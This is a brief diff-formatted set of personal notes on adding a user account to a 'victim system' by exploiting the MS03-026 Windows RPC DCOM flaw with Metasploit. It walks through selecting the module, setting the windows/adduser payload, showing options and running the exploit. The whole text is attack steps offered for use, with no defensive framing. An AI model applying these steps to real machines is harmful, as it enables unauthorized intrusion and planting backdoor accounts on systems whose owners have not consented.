@@ -1,0 +1,8 @@
+how to add a user in victim system
+
+ms03-026
+use it
+set payload 		..2 times tab after space
+set payload windows/adduser
+show options
+exploit
